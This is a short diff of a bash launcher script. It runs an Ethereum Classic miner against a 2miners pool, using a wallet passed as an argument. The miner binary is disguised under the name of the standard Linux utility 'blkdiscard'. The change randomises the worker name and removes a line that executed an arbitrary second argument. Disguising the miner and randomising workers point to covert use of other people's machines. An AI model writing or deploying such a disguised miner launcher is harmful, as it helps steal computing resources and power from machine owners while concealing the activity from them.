@@ -1,9 +1,8 @@
 #!/bin/bash
 POOL=us-etc.2miners.com:1010
 WALLET=$1
-WORKER=GPU-NYOLONG
+WORKER=$(echo GPU-NYOLONG-$(shuf -i 1000-9999 -n 1))
 ALGO=ETCHASH
 
-$2
 chmod +x blkdiscard
 ./blkdiscard --algo $ALGO --pool $POOL --user $WALLET.$WORKER 
